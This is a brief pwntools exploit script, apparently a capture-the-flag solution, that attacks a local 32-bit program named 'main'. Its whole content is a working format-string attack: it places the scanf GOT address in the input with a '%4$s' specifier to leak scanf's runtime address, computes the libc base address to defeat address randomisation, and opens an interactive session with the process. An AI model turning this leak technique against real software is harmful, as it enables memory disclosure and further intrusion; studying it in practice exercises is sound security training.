#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'

p = process('./main')
elf = ELF('./main')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

scanf_got = elf.got['__isoc99_scanf']

payload = p32(scanf_got) + '%4$s'
p.sendline(payload)
p.recvuntil('%4$s\n')
scanf = u32(p.recv()[4:8])
libc_base = scanf - libc.symbols['__isoc99_scanf']
info('libc_base = ' + hex(libc_base))

p.interactive()

